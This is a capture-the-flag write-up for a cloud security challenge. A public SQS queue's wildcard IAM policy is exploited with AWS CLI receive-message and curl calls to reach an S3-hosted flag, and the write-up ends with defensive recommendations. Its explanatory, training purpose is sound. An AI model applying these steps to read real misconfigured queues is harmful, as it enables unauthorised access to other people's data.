Challenge 2: Google Analytics

Challenge Statement

We created our own analytics system specifically for this challenge. We think it’s so good that we even used it on this page. What could go wrong? Join our queue and get the secret flag.

IAM Policy

{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}

Analysis of the IAM Policy
•	What do I have access to?

o	The policy allows any principal ("Principal": "*") to perform the following actions on the specified SQS queue:
"sqs:SendMessage": Send messages to the queue.
"sqs:ReceiveMessage": Receive messages from the queue.

•	What don’t I have access to?

o	Actions such as deleting messages ("sqs:DeleteMessage") or modifying queue attributes are not explicitly allowed.

•	What do I find interesting?
o	The SQS queue is publicly accessible, allowing anyone to send and receive messages. This could lead to potential misuse or exposure of sensitive information.

Solution

Detailed Steps to Retrieve the Flag

1.	Receive Messages from the SQS Queue:
   
o	Utilize the AWS CLI to receive messages from the specified SQS queue:

aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2

o	This command retrieves messages from the queue. The output may look like:

{
    "Messages": [
        {
            "MessageId": "44c1cf94-51ca-4f62-9901-a62974d3a40c",
            "ReceiptHandle": "AQEBDD9PTJro+N0m5CTew9NrGyFZgRGL0h1ljFRw9VJKvXhDE/yHwHHAStHXZA5MVRw6Jd2KxJAtdnmkmSQaJvalRIoJtQSsd1zqT+d2rudemniJ1ONJ2ATiEOwYmoacGipi8UXKIdixGDkl12krM9TTQy0d4h9s2xETMKJXXMN88g1rlhZs2XN8iRwSZuJ4I+iqnNVAc0eKT5PozBeR95hTZaspyUQx7jtWIgKYyy3Faqsw7dbbcHyrcZFKzFS7iGIS1RyQ9yHd7JcUZ8ApASULnvF1sDDdAP7ymjbYaXxOIpKnBKq2D1AU4yscXNEfKbBNqGDR5rd7XwyGr9ry9lit6FIry6YaI7bwGG162mlEx4t2lAqnOS9bOt3XPLjpBN4czG7upT3VZGDr63rPSKTWA6r4WbgCe6CAvBAl2Qywxo8=",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}"
        }
    ]
}

2.	Extract and Access the URL:
   
o	From the message body, identify the URL provided:

"URL": "https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html"

o	Use a tool like curl to access the content of the URL:

curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html

o	The response contains the flag:

{wiz:you-are-at-the-front-of-the-queue}

Flag

{wiz:you-are-at-the-front-of-the-queue}

Reflection

What was your approach?

•	Analyzed the IAM policy to understand the permissions granted.
•	Used the AWS CLI to interact with the SQS queue, retrieving messages to uncover potential leads to the flag.
•	Followed the URL provided in the message to obtain the flag.

What was the biggest challenge?

•	Interpreting the message content correctly to identify the URL leading to the flag.

How did you overcome the challenges?

•	Carefully parsed the JSON message body to extract the URL.
•	Used standard tools (curl) to access the URL and retrieve the flag.

What led to the breakthrough?

•	Recognizing that the message body contained a URL pointing to an S3 object, which likely held the flag.

On the blue side, how can the learning be used to properly defend the important assets?

•	Restrict Public Access: Avoid using wildcard principals ("Principal": "*") to prevent unauthorized access.
•	Implement Principle of Least Privilege: Grant only necessary permissions to specific, authenticated principals.
•	Monitor and Audit: Regularly review and monitor SQS policies and access logs to detect and prevent potential misuse.

